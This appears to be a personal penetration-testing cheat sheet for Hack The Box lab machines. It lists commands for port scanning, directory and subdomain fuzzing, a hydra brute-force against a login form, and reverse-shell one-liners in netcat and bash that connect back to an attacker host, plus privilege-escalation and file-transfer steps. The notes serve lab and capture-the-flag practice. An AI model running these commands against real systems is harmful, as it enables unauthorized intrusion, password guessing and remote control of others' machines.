# enumeration
nmap <ipadd> -p- -T4 -v
nmap <ipadd> -p22,80 -A #or any other interesting ports

sudo vim /etc/hosts #if http service found, try the webpage after adding the IP addr to hosts

nikto -host <ipadd> #if http service, could try a nikto too

# if login page is available, try looking for default creds for the application or if it has any known exploits 

# directory fuzzing / dir busting
dirsearch -u http://cozyhosting.htb

gobuster dir -u http://cozyhosting.htb/ -w /usr/share/seclists/Discovery/Web-Content/big.txt

ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://ignition.htb/FUZZ #details here https://github.com/ffuf/ffuf 

# can also try vhost search in there for subdomains
gobuster vhost -u http://devvortex.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# check interesting directories (check for usernames, session IDs, view source, cookies)
# burpsuite intercept and repeat and try stuff
# try bruteforcing with hydra
sudo hydra -l admin -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt 10.129.214.78 http-post-form '/login:username=admin&password=^PASS^:The account sign-in was incorrect or your account is disabled temporarily. Please wait and try again later.'

# if vuln service like ftp or samba etc, try reverse shell

# setup a listener 
nc –nvlp 5555 #netcat

# actual rev shells
nc -e /bin/sh <attacker IP> <attacker port> #netcat

bash -i >& /dev/tcp/<attacker IP>/<attacker port> 0>&1 #bash

#python, php, powershell, perl, ruby etc + general good reverse shell stuff
# https://medium.com/@cuncis/reverse-shell-cheat-sheet-creating-and-using-reverse-shells-for-penetration-testing-and-security-d25a6923362e


# after reverse shell, try all usuals and navigate, then try to see what can be elevated like
sudo -l
# or download a file with
nc -l <local port> > <file>
